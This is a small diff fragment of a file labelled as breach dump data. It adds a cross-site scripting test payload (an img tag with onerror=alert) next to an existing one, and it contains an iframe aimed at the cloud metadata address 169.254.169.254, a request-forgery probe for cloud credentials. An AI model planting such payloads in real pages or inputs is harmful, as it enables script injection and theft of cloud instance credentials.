@@ -3,6 +3,8 @@ libregalactic data breach dump data
 
 <img src=1 onerror=alert(0);>
 
+<img src="test" onerror=alert(0);>
+
 <iframe src="http://169.254.169.254/latest/meta-data/">
 
 USERS
